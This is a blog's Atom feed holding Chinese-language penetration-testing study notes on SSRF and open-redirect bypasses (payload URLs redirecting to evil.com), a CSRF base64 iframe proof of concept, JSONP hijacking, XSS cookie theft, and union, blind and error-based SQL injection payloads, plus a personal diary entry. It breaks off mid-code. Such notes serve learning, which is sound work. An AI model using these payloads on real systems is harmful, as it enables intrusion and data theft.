<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>xiaoG</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2021-01-18T08:28:00.537Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>John Doe</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>ssrf与URL重定向Bypass</title>
    <link href="http://example.com/wiki/ssrf%E4%B8%8EURL%E9%87%8D%E5%AE%9A%E5%90%91Bypass/"/>
    <id>http://example.com/wiki/ssrf%E4%B8%8EURL%E9%87%8D%E5%AE%9A%E5%90%91Bypass/</id>
    <published>2021-01-18T07:28:02.000Z</published>
    <updated>2021-01-18T08:28:00.537Z</updated>
    
    <content type="html"><![CDATA[<h2 id="URL限制绕过"><a href="#URL限制绕过" class="headerlink" title="URL限制绕过"></a>URL限制绕过</h2><p><img src="C:\Users\XiaoG\AppData\Roaming\Typora\typora-user-images\image-20210118152944507.png" alt="image-20210118152944507"></p><p>加上xip.io：提供dns解析的服务。如果加上例如127.0.0.1.xip.io会解析成127.0.0.1</p><p><img src="C:\Users\XiaoG\AppData\Roaming\Typora\typora-user-images\image-20210118155127572.png" alt="image-20210118155127572"></p><h2 id="畸形地址的绕过"><a href="#畸形地址的绕过" class="headerlink" title="畸形地址的绕过"></a>畸形地址的绕过</h2><p>可以Fuzz</p><ol><li><p>单斜线”/“绕过<a href="https://www.landgrey.me/redirect.php?url=/www.evil.com">https://www.landgrey.me/redirect.php?url=/www.evil.com</a></p></li><li><p>缺少协议绕过<a href="https://www.landgrey.me/redirect.php?url=//www.evil.com">https://www.landgrey.me/redirect.php?url=//www.evil.com</a></p></li><li><p> 多斜线”/“前缀绕过<a href="https://www.landgrey.me/redirect.php?url=///www.evil.comhttps://www.landgrey.me/redirect.php?url=////www.evil.com">https://www.landgrey.me/redirect.php?url=///www.evil.comhttps://www.landgrey.me/redirect.php?url=////www.evil.com</a></p></li><li><p> 利用”@”符号绕过<a href="https://www.landgrey.me/redirect.php?url=https://www.landgrey.me@www.evil.com">https://www.landgrey.me/redirect.php?url=https://www.landgrey.me@www.evil.com</a></p></li><li><p> 利用反斜线”&quot;绕过<a href="https://www.landgrey.me/redirect.php?url=https://www.evil.com%5Cwww.landgrey.me">https://www.landgrey.me/redirect.php?url=https://www.evil.com\www.landgrey.me</a></p></li><li><p> 利用”#”符号绕过<a href="https://www.landgrey.me/redirect.php?url=https://www.evil.com#www.landgrey.me">https://www.landgrey.me/redirect.php?url=https://www.evil.com#www.landgrey.me</a></p></li><li><p> 利用”?”号绕过<a href="https://www.landgrey.me/redirect.php?url=https://www.evil.com?www.landgrey.me">https://www.landgrey.me/redirect.php?url=https://www.evil.com?www.landgrey.me</a></p></li><li><p>利用”\“绕过<a href="https://www.landgrey.me/redirect.php?url=https://www.evil.com%5C%5Cwww.landgrey.me">https://www.landgrey.me/redirect.php?url=https://www.evil.com\\www.landgrey.me</a></p></li><li><p>利用”.”绕过</p><p><a href="https://www.landgrey.me/redirect.php?url=.evil">https://www.landgrey.me/redirect.php?url=.evil</a>           (可能会跳转到<a href="http://www.landgrey.me.evil域名/">www.landgrey.me.evil域名</a>)</p><p><a href="https://www.landgrey.me/redirect.php?url=.evil.com">https://www.landgrey.me/redirect.php?url=.evil.com</a>       (可能会跳转到evil.com域名)</p><p>10.重复特殊字符绕过</p><p><a href="https://www.landgrey.me/redirect.php?url=///www.evil.com//">https://www.landgrey.me/redirect.php?url=///www.evil.com//</a>..</p><p><a href="https://www.landgrey.me/redirect.php?url=////www.evil.com//">https://www.landgrey.me/redirect.php?url=////www.evil.com//</a>..</p><h2 id="SSRF对于请求内网地址的限制"><a href="#SSRF对于请求内网地址的限制" class="headerlink" title="SSRF对于请求内网地址的限制"></a>SSRF对于请求内网地址的限制</h2><h3 id="利用畸形网址与xio-io结合"><a href="#利用畸形网址与xio-io结合" class="headerlink" title="利用畸形网址与xio.io结合"></a>利用畸形网址与xio.io结合</h3><p>例如改成<img src="C:\Users\XiaoG\AppData\Roaming\Typora\typora-user-images\image-20210118161331230.png" alt="image-20210118161331230"></p><h3 id="利用HOST"><a href="#利用HOST" class="headerlink" title="利用HOST"></a>利用HOST</h3><p>利用服务器host</p><p>更改host，访问test.com优先指向127.0.0.1</p><h3 id="利用302跳转"><a href="#利用302跳转" class="headerlink" title="利用302跳转"></a>利用302跳转</h3><h3 id="更改IP的写法"><a href="#更改IP的写法" class="headerlink" title="更改IP的写法"></a>更改IP的写法</h3><p>正则表达式和进制更改</p><p><img src="C:\Users\XiaoG\AppData\Roaming\Typora\typora-user-images\image-20210118161540153.png" alt="image-20210118161540153"></p><h3 id="利用其它的协议"><a href="#利用其它的协议" class="headerlink" title="利用其它的协议"></a>利用其它的协议</h3><p>file，gopher，ftp..</p><h3 id="迎合指定的后缀"><a href="#迎合指定的后缀" class="headerlink" title="迎合指定的后缀"></a>迎合指定的后缀</h3><p><a href="http://127.0.0.1/Discuz/upload/forum.php?mod=ajax&amp;action=downremoteimg&amp;message=%5Bimg%5Dhttp://baidu.com/?data=1.jpg%5B/img%5D">http://127.0.0.1/Discuz/upload/forum.php?mod=ajax&amp;action=downremoteimg&amp;message=[img]http://baidu.com/?data=1.jpg[/img]</a></p></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;URL限制绕过&quot;&gt;&lt;a href=&quot;#URL限制绕过&quot; class=&quot;headerlink&quot; title=&quot;URL限制绕过&quot;&gt;&lt;/a&gt;URL限制绕过&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;C:\Users\XiaoG\AppData\Roaming\Typora\ty</summary>
      
    
    
    
    <category term="渗透学习" scheme="http://example.com/categories/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/"/>
    
    
  </entry>
  
  <entry>
    <title>ssrf</title>
    <link href="http://example.com/wiki/ssrf/"/>
    <id>http://example.com/wiki/ssrf/</id>
    <published>2021-01-17T03:37:21.000Z</published>
    <updated>2021-01-18T06:22:03.307Z</updated>
    
    <content type="html"><![CDATA[<h2 id="SSRF漏洞"><a href="#SSRF漏洞" class="headerlink" title="SSRF漏洞"></a>SSRF漏洞</h2><p>是服务端请求伪造。</p><p><img src="C:\Users\XiaoG\AppData\Roaming\Typora\typora-user-images\image-20210118135327605.png" alt="image-20210118135327605"></p><p>上图为ssrf漏洞图示</p><p>利用ssrf漏洞可以探测第三方网站或者探测外网探测不到的本服务器的内网网络。</p><h3 id="SSRF（curl）"><a href="#SSRF（curl）" class="headerlink" title="SSRF（curl）"></a>SSRF（curl）</h3><p>curl主要探测内网机器，网络。</p><p><img src="C:\Users\XiaoG\AppData\Roaming\Typora\typora-user-images\image-20210118140507261.png" alt="image-20210118140507261"></p><p>类似上方，传入参数可以请求第三方网站</p><p>可以探测内网端口和机器</p><p>可以利用ceye.io验证漏洞是否存在</p><p>在利用burp验证漏洞是否可以利用</p><p>可以利用不同的协议去执行，读取本地文件</p><p>可以对他使用DDOS攻击</p><p>也可以利用python脚本探测端口</p><p><img src="C:\Users\XiaoG\AppData\Roaming\Typora\typora-user-images\image-20210118141501787.png" alt="image-20210118141501787"></p><p>可以利用googlehacker查找url或api关键字</p><p>filename，share，wap，url，link，src，source，target，u，display，sourceURl，imageURL，domai</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;SSRF漏洞&quot;&gt;&lt;a href=&quot;#SSRF漏洞&quot; class=&quot;headerlink&quot; title=&quot;SSRF漏洞&quot;&gt;&lt;/a&gt;SSRF漏洞&lt;/h2&gt;&lt;p&gt;是服务端请求伪造。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;C:\Users\XiaoG\AppData\Roam</summary>
      
    
    
    
    <category term="渗透学习" scheme="http://example.com/categories/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/"/>
    
    
  </entry>
  
  <entry>
    <title>前端漏洞补充</title>
    <link href="http://example.com/wiki/%E5%89%8D%E7%AB%AF%E6%BC%8F%E6%B4%9E%E8%A1%A5%E5%85%85/"/>
    <id>http://example.com/wiki/%E5%89%8D%E7%AB%AF%E6%BC%8F%E6%B4%9E%E8%A1%A5%E5%85%85/</id>
    <published>2021-01-13T08:38:30.000Z</published>
    <updated>2021-01-13T08:38:30.405Z</updated>
    
    <content type="html"><![CDATA[<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><blockquote><ul><li><a href=""></a></li><li><a href=""></a></li></ul></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;参考资料&quot;&gt;&lt;a href=&quot;#参考资料&quot; class=&quot;headerlink&quot; title=&quot;参考资料&quot;&gt;&lt;/a&gt;参考资料&lt;/h2&gt;&lt;blockquote&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;&quot;&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;&quot;&gt;&lt;/a&gt;&lt;/l</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>JSON相关问题</title>
    <link href="http://example.com/wiki/JSON%E7%9B%B8%E5%85%B3%E9%97%AE%E9%A2%98/"/>
    <id>http://example.com/wiki/JSON%E7%9B%B8%E5%85%B3%E9%97%AE%E9%A2%98/</id>
    <published>2020-12-23T13:32:45.000Z</published>
    <updated>2020-12-25T13:38:13.460Z</updated>
    
    <content type="html"><![CDATA[<h2 id="JSONP跨域劫持和跨域读取资源导致信息泄露"><a href="#JSONP跨域劫持和跨域读取资源导致信息泄露" class="headerlink" title="JSONP跨域劫持和跨域读取资源导致信息泄露"></a>JSONP跨域劫持和跨域读取资源导致信息泄露</h2><p>用户访问网站a,返回手机号码，格式是</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">phoneNumber</span><span class="params">(&#123;<span class="string">&quot;phonenumber&quot;</span>:<span class="string">&quot;13399978910&quot;</span>&#125;)</span></span></span><br></pre></td></tr></table></figure><p>当用户访问一个恶意站点b时，站点b通过JSONP访问网站a获取到用户的手机号码</p><h2 id="同源策略（Same-origin-policy）"><a href="#同源策略（Same-origin-policy）" class="headerlink" title="同源策略（Same origin policy）"></a>同源策略（Same origin policy）</h2><p>同源策略是一种约定，简称sop，是浏览器最基本和核心的安全功能。</p><p>同源策略规定：不同域的客户端脚本在没有授权的情况下，不能读写对方的资源。</p><h3 id="哪些属于同一个域"><a href="#哪些属于同一个域" class="headerlink" title="哪些属于同一个域"></a>哪些属于同一个域</h3><p>必须相同域名，相同端口，相同协议，缺一不可。</p><p><img src="C:\Users\XiaoG\AppData\Roaming\Typora\typora-user-images\image-20201225205315306.png" alt="image-20201225205315306"></p><h2 id="AJAX（无法跨域获取数据）"><a href="#AJAX（无法跨域获取数据）" class="headerlink" title="AJAX（无法跨域获取数据）"></a>AJAX（无法跨域获取数据）</h2><p>异步的javascript和XML。是指⼀种创建交互式、快速动态 ⽹⻚应⽤的⽹⻚开发技术，⽆需重新加载整个⽹⻚的情况下，能够更新部分⽹⻚的技术。XML是说数据传输 的格式是XML，但其实返回的数据还有可能是JSON（⽬前已经成为主流），⽂本，HTML等。</p><h3 id="可以跨域的标签"><a href="#可以跨域的标签" class="headerlink" title="可以跨域的标签"></a>可以跨域的标签</h3><img src="C:\Users\XiaoG\AppData\Roaming\Typora\typora-user-images\image-20201225205905119.png" alt="image-20201225205905119"  /><p>上述标签可以跨域请求远程的资源，但是执行，AJAX返回的是JSON数据，不符合JS语法，要使用回调函数。</p><p><img src="C:\Users\XiaoG\AppData\Roaming\Typora\typora-user-images\image-20201225210127927.png" alt="image-20201225210127927"></p><h2 id="Callback输出点未控制造成xss"><a href="#Callback输出点未控制造成xss" class="headerlink" title="Callback输出点未控制造成xss"></a>Callback输出点未控制造成xss</h2><h3 id="JSON注入"><a href="#JSON注入" class="headerlink" title="JSON注入"></a>JSON注入</h3><p><img src="C:\Users\XiaoG\AppData\Roaming\Typora\typora-user-images\image-20201225211958468.png" alt="image-20201225211958468"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;JSONP跨域劫持和跨域读取资源导致信息泄露&quot;&gt;&lt;a href=&quot;#JSONP跨域劫持和跨域读取资源导致信息泄露&quot; class=&quot;headerlink&quot; title=&quot;JSONP跨域劫持和跨域读取资源导致信息泄露&quot;&gt;&lt;/a&gt;JSONP跨域劫持和跨域读取资源导致信息</summary>
      
    
    
    
    <category term="渗透学习" scheme="http://example.com/categories/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/"/>
    
    
    <category term="JSON相关问题" scheme="http://example.com/tags/JSON%E7%9B%B8%E5%85%B3%E9%97%AE%E9%A2%98/"/>
    
  </entry>
  
  <entry>
    <title>CSRF漏洞</title>
    <link href="http://example.com/wiki/CSRF%E6%BC%8F%E6%B4%9E/"/>
    <id>http://example.com/wiki/CSRF%E6%BC%8F%E6%B4%9E/</id>
    <published>2020-12-21T08:47:15.000Z</published>
    <updated>2020-12-23T13:25:53.766Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CSRF漏洞"><a href="#CSRF漏洞" class="headerlink" title="CSRF漏洞"></a>CSRF漏洞</h1><p>跨站请求伪造：通过欺骗用户的浏览器，让用户点击，使用用户的名义去执行操作。</p><p>制造方法：在burp中抓包然后写成POC，最后使用户点击访问。</p><h2 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h2><p>绕过referer：</p><p>1.使用其它的协议（https://,ftp://,file://,dat://,等），通常使用iframe标签</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe</span><br><span class="line"><span class="attribute">src</span>=<span class="string">&quot;data:text/html;base64,IDxmb3JtIGFjdGlvbj0iaHR0cDovL3Rlc3QuY29tL3Bpa2FjaHUvdnVsL2NzcmYvY3NyZnBvc3QvY3Ny</span></span><br><span class="line"><span class="string">Zl9wb3N0X2VkaXQucGhwIiBtZXRob2Q9IlBPU1QiPgogICAgICA8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJzZXgiIHZhbHVlPSJnaXJ</span></span><br><span class="line"><span class="string">sIiAvPgogICAgICA8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJwaG9uZW51bSIgdmFsdWU9IjExMTExIiAvPgogICAgICA8aW5wdXQgdH</span></span><br><span class="line"><span class="string">lwZT0iaGlkZGVuIiBuYW1lPSJhZGQiIHZhbHVlPSJjaGFpbiIgLz4KICAgICAgPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iZW1haWwiI</span></span><br><span class="line"><span class="string">HZhbHVlPSJ2aW5jZSYjNjQ7cGlrYWNodSYjNDY7Y29tIiAvPgogICAgICA8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJzdWJtaXQiIHZh</span></span><br><span class="line"><span class="string">bHVlPSJzdWJtaXQiIC8+CiAgICAgIDxpbnB1dCB0eXBlPSJzdWJtaXQiIHZhbHVlPSJTdWJtaXQgcmVxdWVzdCIgLz4KICAgIDwvZm9ybT4</span></span><br><span class="line"><span class="string">=&quot;</span>&gt;</span><br></pre></td></tr></table></figure><p>2.referer绕过规则不严谨：</p><p>如果匹配x.com，可以构造一个名为x.com的文件夹进行绕过</p><p>如果匹配<a href="http://x.com,可以制造一个子域名/">http://x.com，可以制造一个子域名</a></p><p>3.寻找跳转链接：</p><p>寻找跳转链接，是页面跳转到自己的csrf请求页面中。</p><p>绕过token：</p><p>1.可以试一下删除token参数或者设置为空（空列表）</p><p>2.可以暴力破解</p><p>3.token值放在了url之中</p><p>用户的页面url中有token值，可以正在页面中放一个危险的链接，用户点击，会提取到用户的token值，再危险页面中的一张图片利用token值。</p><p>4.token值放在了cookie中</p><p>属于前端问题，用户自己对自己校对token值。</p><p>进行会话固定来控制受害者的cookie</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;CSRF漏洞&quot;&gt;&lt;a href=&quot;#CSRF漏洞&quot; class=&quot;headerlink&quot; title=&quot;CSRF漏洞&quot;&gt;&lt;/a&gt;CSRF漏洞&lt;/h1&gt;&lt;p&gt;跨站请求伪造：通过欺骗用户的浏览器，让用户点击，使用用户的名义去执行操作。&lt;/p&gt;
&lt;p&gt;制造方法：在bur</summary>
      
    
    
    
    <category term="渗透学习" scheme="http://example.com/categories/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/"/>
    
    
    <category term="csrf漏洞" scheme="http://example.com/tags/csrf%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>xss漏洞</title>
    <link href="http://example.com/wiki/xss%E6%BC%8F%E6%B4%9E/"/>
    <id>http://example.com/wiki/xss%E6%BC%8F%E6%B4%9E/</id>
    <published>2020-12-11T00:36:14.000Z</published>
    <updated>2020-12-14T01:43:09.940Z</updated>
    
    <content type="html"><![CDATA[<h1 id="xss漏洞"><a href="#xss漏洞" class="headerlink" title="xss漏洞"></a>xss漏洞</h1><p>xss：跨站脚本攻击。将脚本嵌入网站，用户打开就启动了脚本。</p><p>在xss模块，可进行需要的选择。</p><p>获取用户cookie，发到xss平台。</p><p>反射型xss：已经做好的一个页面，让用户访问获取cookie(一次性的)</p><p>储存型xss：一般存在于留言板中，只要用户访问看到留言就会获取cookie(一直有效)</p><p>dom型xss：不经过后端，经过url传入参数去触发攻击（与反射型类似）</p><p>xss盲注：不确定代码被嵌入到哪里，需要闭合，不断尝试</p><h2 id="可能出现的地方"><a href="#可能出现的地方" class="headerlink" title="可能出现的地方"></a>可能出现的地方</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在又<span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span>或<span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span>中</span><br></pre></td></tr></table></figure><p>在弹窗弹出我们输入内容的地方。</p><h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><h3 id="Xsstrike"><a href="#Xsstrike" class="headerlink" title="Xsstrike"></a>Xsstrike</h3><p>在GitHub中，代码写得很不错。最基本语句：</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">python3</span> xsstrike.<span class="keyword">py</span> -<span class="keyword">u</span> <span class="string">&quot;http://exmple.com/exmple.php?page=d3v&amp;name=123&quot;</span></span><br></pre></td></tr></table></figure><p>有多个参数得时候，在要测试的参数后面加上d3v。</p><p>详情查看使用手册。</p><h3 id="burp-suite-中的xss-validator"><a href="#burp-suite-中的xss-validator" class="headerlink" title="burp suite 中的xss validator"></a>burp suite 中的xss validator</h3><p>环境：要下载phantomjs，配置环境</p><p>需要一个xss.js文件，起到监听和交互作用</p><p>到burp中的商店中下载xss validator</p><p>先进入环境监听，在burp中抓包，发送到intruder中，payloads sets中设置extension-generated，然后设置插件</p><p>标识字符修改，在插件的grep phrase中</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;xss漏洞&quot;&gt;&lt;a href=&quot;#xss漏洞&quot; class=&quot;headerlink&quot; title=&quot;xss漏洞&quot;&gt;&lt;/a&gt;xss漏洞&lt;/h1&gt;&lt;p&gt;xss：跨站脚本攻击。将脚本嵌入网站，用户打开就启动了脚本。&lt;/p&gt;
&lt;p&gt;在xss模块，可进行需要的选择。&lt;/p&gt;</summary>
      
    
    
    
    <category term="渗透学习" scheme="http://example.com/categories/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/"/>
    
    
    <category term="xss" scheme="http://example.com/tags/xss/"/>
    
  </entry>
  
  <entry>
    <title>2020-12-8</title>
    <link href="http://example.com/wiki/2020-12-8/"/>
    <id>http://example.com/wiki/2020-12-8/</id>
    <published>2020-12-08T14:52:21.000Z</published>
    <updated>2020-12-08T15:25:28.182Z</updated>
    
    <content type="html"><![CDATA[<h1 id="关于考研"><a href="#关于考研" class="headerlink" title="关于考研"></a>关于考研</h1><p>目标的学校已经有了。</p><p>总的来说考研的复习算是开始了吧，只是没有太多的时间要去复习。</p><p>后期事情变少了，要尽量多挤时间安排复习考研吧。</p><p>2021年主要以考研为主。</p><h1 id="关于渗透学习"><a href="#关于渗透学习" class="headerlink" title="关于渗透学习"></a>关于渗透学习</h1><p>感觉开始正式开始渗透学习还是太晚了，迫于学校的课程，迫于考研，迫于种种的事情，渗透的学习时间越来越少了，自己也应该要珍惜时间了吧。</p><p>尽量在寒假结束之前好好 把web学好，好好的在寒假这一段时间进行各种实战，积累经验，因为在学校里的时间是在太少了。</p><p>在考研期间，尽量抽时间进行学习渗透。</p><h1 id="关于爱情"><a href="#关于爱情" class="headerlink" title="关于爱情"></a>关于爱情</h1><p>猪猪好像比较依赖我，虽然我好像没有什么时间和能力能帮到她什么，但是还是都有拼上自己所有的力气的啊，虽然有时候真的没办法做得到像她心里期待的那样，但是我真的尽力了呀，真的把心思都放上去了呀，一天晚上我的毛概也只是刷了两个视频而已啊…虽然还是会对我发脾气，虽然还是会不想理我，但是谁让我那么喜欢她呢，看到她不开心，我心里更加难过，更加着急…</p><p>猪猪很黏我，虽然她不承认，但是我知道她很想一直和我在一起，很想和我干各种各样的事情，虽然有时候她生气也会说些让我很心疼的话，但是我知道她心里还是很喜欢很喜欢我的啦，虽然她还是会嫌弃我，真的嫌弃我嘛？我觉得她不会嫌弃我的，我觉得她好爱好爱我。</p><p>我想好好的努力，想娶她，想给她幸福的生活，想给她所有的美好，想给她所有的爱。</p><h1 id="关于生活"><a href="#关于生活" class="headerlink" title="关于生活"></a>关于生活</h1><p>生活好累，真的好累好累，累到只想睡一个永远也不用醒过来的觉。</p><p>果然还是应了那一句话——出来混，迟早是要还的。大一大二的懒散，贪玩，在大三大四尽显而出。考研，学习，各种各样的压力铺面而来。期末考快来了，可是不会的还是不会，该开始复习，不能挂科。可是还要备考考研，可是还要学习渗透。可是真的对物理提不起一点点的兴趣啊，真的。不管啦，想办法先及格再说吧。</p><p>接下来的每一天，在外面都要复习，备考考研，回到宿舍要学习渗透。</p><p>看着室友还没有一点点的改变，他们还是能打游戏，能一直陪女朋友聊天，玩。而我回到宿舍只能苦逼的学习。心里有点百感交集。其实我也很想，很想很想打游戏，很想很想把所有的书都扔掉，好好的陪着我的猪猪。可是生活就是这样，推着你走，压着你走。除非我放弃自己，放弃未来。但是这不可能，我知道我未来要干什么，我知道有很多人期盼着我，我不能让任何一个对我有希望的人失望。</p><p>学习加油！考研加油！生活加油！</p><p>”一个人受的委屈都往心里咽“——天高路远</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;关于考研&quot;&gt;&lt;a href=&quot;#关于考研&quot; class=&quot;headerlink&quot; title=&quot;关于考研&quot;&gt;&lt;/a&gt;关于考研&lt;/h1&gt;&lt;p&gt;目标的学校已经有了。&lt;/p&gt;
&lt;p&gt;总的来说考研的复习算是开始了吧，只是没有太多的时间要去复习。&lt;/p&gt;
&lt;p&gt;后期事情变少</summary>
      
    
    
    
    <category term="随想" scheme="http://example.com/categories/%E9%9A%8F%E6%83%B3/"/>
    
    
    <category term="感觉很累" scheme="http://example.com/tags/%E6%84%9F%E8%A7%89%E5%BE%88%E7%B4%AF/"/>
    
  </entry>
  
  <entry>
    <title>sql注入总结</title>
    <link href="http://example.com/wiki/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/"/>
    <id>http://example.com/wiki/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/</id>
    <published>2020-12-08T10:06:52.000Z</published>
    <updated>2020-12-08T15:05:25.436Z</updated>
    
    <content type="html"><![CDATA[<h1 id="各种sql注入的收集以及利用"><a href="#各种sql注入的收集以及利用" class="headerlink" title="各种sql注入的收集以及利用"></a>各种sql注入的收集以及利用</h1><h2 id="sql注入的收集"><a href="#sql注入的收集" class="headerlink" title="sql注入的收集"></a>sql注入的收集</h2><p>在任何与数据库有参数的传递的地方均可能出现sql注入。</p><p>如：搜索框，url中的参数，登录页面（后台页面中居多），搜索框，http头…</p><p>判断方法：</p><p>在参数中加一个 ′ 号，如果报错则存在又注入漏洞</p><p>数字型：若语句为id=1 and  1=1# 正常，若id=1 and  1=2#报错，则为数字型。</p><p>字符型：若语句为id=1’ and ‘1’ =’1’# 正常，若id=1’ and ‘1’ =’2’#报错，则为字符型。</p><h2 id="sql注入类型"><a href="#sql注入类型" class="headerlink" title="sql注入类型"></a>sql注入类型</h2><h3 id="union型"><a href="#union型" class="headerlink" title="union型"></a>union型</h3><p>最重要的是找到闭合的规则。</p><p>可以直接利用查询语句查询数据库内容（权限允许）。</p><p>order by 查询字段数。</p><p>查询当前数据库,当前mysql用户 </p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">union</span> <span class="title">select</span> 1,<span class="title">user</span>(),<span class="title">database</span>()</span></span><br></pre></td></tr></table></figure><p>查询当前数据库里面的表 </p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(<span class="built_in">table_name</span>) <span class="keyword">from</span> information_schema.<span class="keyword">tables</span> <span class="keyword">where</span> table_schema=&quot;data_name&quot;</span><br></pre></td></tr></table></figure><p>查询到敏感表名user，继续查询表里面的字段 </p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(<span class="built_in">column_name</span>) <span class="keyword">from</span> information_schema.<span class="keyword">columns</span> <span class="keyword">where</span> <span class="built_in">table_name</span>=&quot;user&quot;</span><br></pre></td></tr></table></figure><p>查询字段，例如“id”、”passwd”的内容 </p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">union</span> <span class="title">select</span> 1,<span class="title">id</span>,<span class="title">passwd</span> <span class="title">from</span> <span class="title">user</span></span></span><br></pre></td></tr></table></figure><h3 id="布尔型盲注"><a href="#布尔型盲注" class="headerlink" title="布尔型盲注"></a>布尔型盲注</h3><p>查看现象，能报错，但没有报错信息，正确查询也显示不了查询内容就属于布尔盲注，只存在两种状态，对或错。</p><p>只能通过注入语句，返回的页面有没有报错而判定信息。</p><p>先用 </p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable"><span class="keyword">and</span></span> <span class="function"><span class="title"><span class="built_in">length</span></span>(<span class="title">database</span>())&gt;<span class="number">2</span></span></span><br></pre></td></tr></table></figure><p> 来猜数据库的长度，使用的是二分法。</p><p>再用 </p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> substr(<span class="keyword">database</span>(),<span class="number">1</span>,<span class="number">1</span>)=<span class="string">&#x27;t&#x27;</span> </span><br></pre></td></tr></table></figure><p>来确定第一个字母，可用burp跑，26个字母,哪个字母返回正常则代表第一个字母就是它。</p><p>结合适合的长度进行猜解。</p><p>后面的所有信息都像union注入一般进行，但是要一个一个进行猜解，需要时间很长。</p><h3 id="报错型注入"><a href="#报错型注入" class="headerlink" title="报错型注入"></a>报错型注入</h3><p>注入点有sql的报错信息就可以进行报错注入</p><p>形如布尔盲注，只要猜解出闭合类型，返回正常即可进行注入</p><p>报错获取当前数据库语句：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">and</span> updatexml(<span class="number">1</span>,concat(<span class="number">0</span>x<span class="number">7</span>e,(select database()),<span class="number">0</span>x<span class="number">7</span>e),<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>floor报错获取当前数据库：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> count(*),concat((<span class="keyword">database</span>()),floor (rand(<span class="number">0</span>)*<span class="number">2</span>))x <span class="keyword">from</span> information_schema.<span class="keyword">tables</span> <span class="keyword">group</span> <span class="keyword">by</span> x)a)</span><br></pre></td></tr></table></figure><p>后面的信息获取语句形如union类型</p><h3 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h3><p>当页面有注入时，可以尝试加下面这个函数测试</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title"><span class="built_in">sleep</span></span>(<span class="number">5</span>);</span></span><br></pre></td></tr></table></figure><p>如果有页面延迟5秒以上时则为时间盲注</p><p>接着猜出闭合的类型</p><p>形如布尔盲注一步一步获取信息</p><h2 id="http头注入"><a href="#http头注入" class="headerlink" title="http头注入"></a>http头注入</h2><p>可注入的地方：cookie，Rerferer，User-Agent，X-Forwarded-For…</p><p>注入姿势</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 